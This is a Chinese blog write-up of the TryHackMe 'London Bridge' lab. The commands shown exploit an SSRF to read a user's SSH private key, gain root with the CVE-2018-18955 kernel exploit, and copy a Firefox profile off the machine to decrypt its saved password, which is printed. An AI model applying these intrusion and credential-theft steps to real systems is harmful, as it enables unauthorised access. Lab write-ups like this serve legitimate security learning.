---
title: THM the London Bridge
published: 2025-05-26
pinned: false
description: THM the London Bridge wp
tags: ['THM']
category: 渗透
licenseName: "MIT"
author: zsm
draft: false
date: 2025-05-26
pubDate: 2025-05-26
---


## 前言
一鼓作气，再刷一个，THM的一个中等靶机

## 外网打点
```
nmap -sC -sV 10.10.207.41   
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-05-24 20:54 CST
Stats: 0:00:55 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 50.00% done; ETC: 20:55 (0:00:20 remaining)
Stats: 0:01:01 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 50.00% done; ETC: 20:56 (0:00:25 remaining)
Stats: 0:01:44 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 50.00% done; ETC: 20:57 (0:01:08 remaining)
Nmap scan report for 10.10.207.41
Host is up (0.23s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 58:c1:e4:79:ca:70:bc:3b:8d:b8:22:17:2f:62:1a:34 (RSA)
|   256 2a:b4:1f:2c:72:35:7a:c3:7a:5c:7d:47:d6:d0:73:c8 (ECDSA)
|_  256 1c:7e:d2:c9:dd:c2:e4:ac:11:7e:45:6a:2f:44:af:0f (ED25519)
8080/tcp open  http-proxy gunicorn
|_http-title: Explore London
| fingerprint-strings:
|   GetRequest:
|     HTTP/1.0 200 OK
|     Server: gunicorn
|     Date: Sat, 24 May 2025 12:55:24 GMT
|     Connection: close
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 2682
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="UTF-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1.0">
|     <title>Explore London</title>
|     <style>
|     body {
|     font-family: Arial, sans-serif;
|     margin: 0;
|     padding: 0;
|     background-color: #f2f2f2;
|     header {
|     background-color: #333;
|     color: #fff;
|     padding: 10px 20px;
|     text-align: center;
|     background-color: #444;
|     color: #fff;
|     padding: 10px 20px;
|     text-align: center;
|     color: #fff;
|     text-decoration: none;
|     margin: 0 10p
|   HTTPOptions:
|     HTTP/1.0 200 OK
|     Server: gunicorn
|     Date: Sat, 24 May 2025 12:55:25 GMT
|     Connection: close
|     Content-Type: text/html; charset=utf-8
|     Allow: HEAD, GET, OPTIONS
|_    Content-Length: 0
|_http-server-header: gunicorn
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
...
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 178.62 seconds
```

没什么有用的，disearch启动
```
python dirsearch.py -u http://10.10.207.41:8080 -w /Users/zsm/CTF/tool/kali_word/dirb/wordlists/big.txt 

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, asp, aspx, jsp, html, htm | HTTP method: GET | Threads: 25 | Wordlist size: 20469

Target: http://10.10.207.41:8080/

[21:07:24] Scanning:
[21:08:23] 200 -    2KB - /contact
[21:08:47] 405 -   178B - /feedback
[21:08:55] 200 -    2KB - /gallery
[21:10:46] 405 -   178B - /upload
[21:10:51] 405 -   178B - /view_image

Task Completed
```

访问`view_image`，得到
```
Method Not Allowed

The method is not allowed for the requested URL.
```

GET不行，换POST，发现让你传url，并且会解析成`img`，估计是打ssrf的，ffuf测试一下
```
./ffuf -u 'http://10.10.207.41:8080//view_image' -w /Users/zsm/CTF/tool/kali_word/dirb/wordlists/big.txt  -H 'Content-Type: application/x-www-form-urlencoded' -X POST -d 'FUZZ=http://10.21.155.141/test' -mc all -t 50 -ic -fs 823

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0
________________________________________________

 :: Method           : POST
 :: URL              : http://10.10.207.41:8080//view_image
 :: Wordlist         : FUZZ: /Users/zsm/CTF/tool/kali_word/dirb/wordlists/big.txt
 :: Header           : Content-Type: application/x-www-form-urlencoded
 :: Data             : FUZZ=http://10.21.155.141/test
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 50
 :: Matcher          : Response status: all
 :: Filter           : Response size: 823
________________________________________________

www                     [Status: 500, Size: 290, Words: 37, Lines: 5, Duration: 544ms]
:: Progress: [20469/20469] :: Job [1/1] :: 184 req/sec :: Duration: [0:01:44] :: Errors: 0 ::
```

试试ip
![image.png](https://www.helloimg.com/i/2025/05/26/6833f84fdf9bd.png)
继续
![image-1.png](https://www.helloimg.com/i/2025/05/26/6833f86074356.png)
这种情况就很对了，测测有没有什么文件
```
./ffuf -u 'http://10.10.207.41:8080//view_image' -w /Users/zsm/CTF/tool/kali_word/dirb/wordlists/big.txt  -H 'Content-Type: application/x-www-form-urlencoded' -X POST -d 'www=http://127.0.1/FUZZ' -mc all -t 50 -ic -fs 469

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0
________________________________________________

 :: Method           : POST
 :: URL              : http://10.10.207.41:8080//view_image
 :: Wordlist         : FUZZ: /Users/zsm/CTF/tool/kali_word/dirb/wordlists/big.txt
 :: Header           : Content-Type: application/x-www-form-urlencoded
 :: Data             : www=http://127.0.1/FUZZ
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 50
 :: Matcher          : Response status: all
 :: Filter           : Response size: 469
________________________________________________

.profile                [Status: 200, Size: 807, Words: 128, Lines: 28, Duration: 256ms]
.bash_history           [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 284ms]
.bashrc                 [Status: 200, Size: 3771, Words: 522, Lines: 118, Duration: 295ms]
.ssh                    [Status: 200, Size: 399, Words: 18, Lines: 17, Duration: 322ms]
static                  [Status: 200, Size: 420, Words: 19, Lines: 18, Duration: 244ms]
templates               [Status: 200, Size: 1294, Words: 358, Lines: 44, Duration: 243ms]
uploads                 [Status: 200, Size: 630, Words: 23, Lines: 22, Duration: 253ms]
:: Progress: [20469/20469] :: Job [1/1] :: 91 req/sec :: Duration: [0:01:51] :: Errors: 0 ::
```

看看`.ssh`里面有没有什么好东西
![image-2.png](https://www.helloimg.com/i/2025/05/26/6833f85266f6d.png)

```
    ~/thm1 ············································································································································· ctf-web   with zsm@ubuntu  at 09:30:43 PM  ─╮
❯ curl -s 'http://10.10.207.41:8080/view_image' -d 'www=http://127.0.1/.ssh/id_rsa' -o id_rsa         
    ~/thm1 ············································································································································· ctf-web   with zsm@ubuntu  at 09:31:14 PM  ─╮
❯ ls      
id_rsa
    ~/thm1 ············································································································································· ctf-web   with zsm@ubuntu  at 09:31:16 PM  ─╮
❯ chmod 600 id_rsa     
    ~/thm1 ············································································································································· ctf-web   with zsm@ubuntu  at 09:33:45 PM  ─╮
❯ curl -s 'http://10.10.207.41:8080/view_image' -d 'www=http://127.0.1/.ssh/authorized_keys'  
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDPXIWuD0UBkAjhHftpBaf949OT8wp/PYpD44TjkoSuC4vfhiPkpzVUmMNNM1GZz681FmJ4LwTB6VaCnBwoAJrvQp7ar/vNEtYeHbc5TFaJIAA5FN5rWzl66zeCFNaNx841E4CQSDs7dew3CCn3dRQHzBtT4AOlmcUs9QMSsUqhKn53EbivHCqkCnqZqqwTh0hkd0Cr5i3r/Yc4REqsVaI41Cl3pkDxrfbmhZdjxRpES8pO5dyOUvnq3iJZDOxFBsG8H4RODaZrTW78eZbcz1LKug/KlwQ6q8+e4+mpcdm7sHAAszk0eFcI2a37QQ4Fgq96OwMDo15l8mDDrk1Ur7aF beth@london
```

拿到用户名，ssh上去
```
beth@london:~$ id
uid=1000(beth) gid=1000(beth) groups=1000(beth)
beth@london:~$ ls -la
total 72
drwxr-xr-x 11 beth beth 4096 May  7  2024 .
drwxr-xr-x  4 root root 4096 Mar 10  2024 ..
-rw-rw-r--  1 beth beth 3215 Apr 17  2024 app.py
lrwxrwxrwx  1 root root    9 Sep 17  2023 .bash_history -> /dev/null
-rw-r--r--  1 beth beth  220 Sep 16  2023 .bash_logout
-rw-r--r--  1 beth beth 3771 Sep 16  2023 .bashrc
drwx------  4 beth beth 4096 Mar 11  2024 .cache
drwxrwxr-x  6 beth beth 4096 Sep 17  2023 .env
drwx------  3 beth beth 4096 Mar 10  2024 .gnupg
-rw-rw-r--  1 beth beth  328 Apr 17  2024 gunicorn_config.py
-rw-r--r--  1 beth beth 1270 Apr 17  2024 index.html
drwxrwxr-x  5 beth beth 4096 Mar 11  2024 .local
-rw-r--r--  1 beth beth  807 Sep 16  2023 .profile
drwxrwxr-x  2 beth beth 4096 Apr 23  2024 __pycache__
-rw-rw-r--  1 root root   66 Sep 18  2023 .selected_editor
drwx------  2 beth beth 4096 Mar 25  2024 .ssh
drwxrwxr-x  2 beth beth 4096 Apr 17  2024 static
-rw-r--r--  1 beth beth    0 Sep 16  2023 .sudo_as_admin_successful
drwxrwxr-x  2 beth beth 4096 Apr 17  2024 templates
drwxrwxr-x  2 beth beth 4096 Apr 17  2024 uploads
beth@london:~$ cd __pycache__
beth@london:~/__pycache__$ ls
app.cpython-36.pyc  gunicorn_config.cpython-36.pyc  user.txt
```

## 提权
```
beth@london:~$ uname -a
Linux london 4.15.0-112-generic #113-Ubuntu SMP Thu Jul 9 23:41:39 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
```
内核很老了，先linpeas.sh启动(懒得自己找cve了)

```
[+] [CVE-2018-18955] subuid_shell

   Details: https://bugs.chromium.org/p/project-zero/issues/detail?id=1712
   Exposure: probable
   Tags: [ ubuntu=18.04 ]{kernel:4.15.0-20-generic},fedora=28{kernel:4.16.3-301.fc28}
   Download URL: https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/45886.zip
   Comments: CONFIG_USER_NS needs to be enabled
```

本地dump下来，靶机下载
```
wget -r -np -nH --cut-dirs=1 http://10.21.155.141:8000/

beth@london:/tmp/poc$ bash exploit.dbus.sh
[*] Compiling...
[*] Creating /usr/share/dbus-1/system-services/org.subuid.Service.service...
[.] starting
[.] setting up namespace
[~] done, namespace sandbox set up
[.] mapping subordinate ids
[.] subuid: 100000
[.] subgid: 100000
[~] done, mapped subordinate ids
[.] executing subshell
[*] Creating /etc/dbus-1/system.d/org.subuid.Service.conf...
[.] starting
[.] setting up namespace
[~] done, namespace sandbox set up
[.] mapping subordinate ids
[.] subuid: 100000
[.] subgid: 100000
[~] done, mapped subordinate ids
[.] executing subshell
[*] Launching dbus service...
Error org.freedesktop.DBus.Error.NoReply: Did not receive a reply. Possible causes include: the remote application did not send a reply, the message bus security policy blocked the reply, the reply timeout expired, or the network connection was broken.
[+] Success:
-rwsrwxr-x 1 root root 8392 May 24 06:50 /tmp/sh
[*] Cleaning up...
[*] Launching root shell: /tmp/sh
root@london:/tmp/poc# id
uid=0(root) gid=0(root) groups=0(root),1000(beth)
```

成功拿到root
```
root@london:/root# ls -la
total 52
drwx------  6 root root 4096 Apr 23  2024 .
drwxr-xr-x 23 root root 4096 Apr  7  2024 ..
lrwxrwxrwx  1 root root    9 Sep 18  2023 .bash_history -> /dev/null
-rw-r--r--  1 root root 3106 Apr  9  2018 .bashrc
drwx------  3 root root 4096 Apr 23  2024 .cache
-rw-r--r--  1 beth beth 2246 Mar 16  2024 flag.py
-rw-r--r--  1 beth beth 2481 Mar 16  2024 flag.pyc
drwx------  3 root root 4096 Apr 23  2024 .gnupg
drwxr-xr-x  3 root root 4096 Sep 16  2023 .local
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
drwxr-xr-x  2 root root 4096 Mar 16  2024 __pycache__
-rw-rw-r--  1 root root   27 Sep 18  2023 .root.txt
-rw-r--r--  1 root root   66 Mar 10  2024 .selected_editor
-rw-r--r--  1 beth beth  175 Mar 16  2024 test.py
```

## 第三个账户的密码
```
root@london:/root# ls /home
beth  charles
root@london:/root# cd /home/charles/
root@london:/home/charles# ls
root@london:/home/charles# ls -la
total 24
drw------- 3 charles charles 4096 Apr 23  2024 .
drwxr-xr-x 4 root    root    4096 Mar 10  2024 ..
lrwxrwxrwx 1 root    root       9 Apr 23  2024 .bash_history -> /dev/null
-rw------- 1 charles charles  220 Mar 10  2024 .bash_logout
-rw------- 1 charles charles 3771 Mar 10  2024 .bashrc
drw------- 3 charles charles 4096 Mar 16  2024 .mozilla
-rw------- 1 charles charles  807 Mar 10  2024 .profile
root@london:/home/charles# cd .mozilla
root@london:/home/charles/.mozilla# ls -la
total 12
drw------- 3 charles charles 4096 Mar 16  2024 .
drw------- 3 charles charles 4096 Apr 23  2024 ..
drw------- 3 charles charles 4096 Mar 16  2024 firefox
root@london:/home/charles/.mozilla# cd firefox/
root@london:/home/charles/.mozilla/firefox# ls -la
total 12
drw-------  3 charles charles 4096 Mar 16  2024 .
drw-------  3 charles charles 4096 Mar 16  2024 ..
drw------- 16 charles beth    4096 Mar 16  2024 8k3bf3zp.charles
```

这个东西以前没有遇到过，主要是火狐浏览器的信息恢复，可以在网上找到[脚本](https://github.com/unode/firefox_decrypt.git)去恢复，先吧文件dump到本地
```
tar -cvzf /tmp/firefox.tar.gz firefox

scp -i id_rsa beth@10.10.207.41:/tmp/firefox.tar.gz .
```

然后去运行脚本恢复
```
python3 firefox_decrypt/firefox_decrypt.py firefox/8k3bf3zp.charles                                ─╯
2025-05-24 22:00:27,307 - WARNING - profile.ini not found in firefox/8k3bf3zp.charles
2025-05-24 22:00:27,307 - WARNING - Continuing and assuming 'firefox/8k3bf3zp.charles' is a profile location

Website:   https://www.buckinghampalace.com
Username: 'Charles'
Password: 'thekingofengland'
```

## 总结
这个靶机主要是信息收集和ssrf，提权部分并没有特别多花里胡哨的操作，主要是文件上传和下载比较值得注意，你也不想文件都dump不下来吧～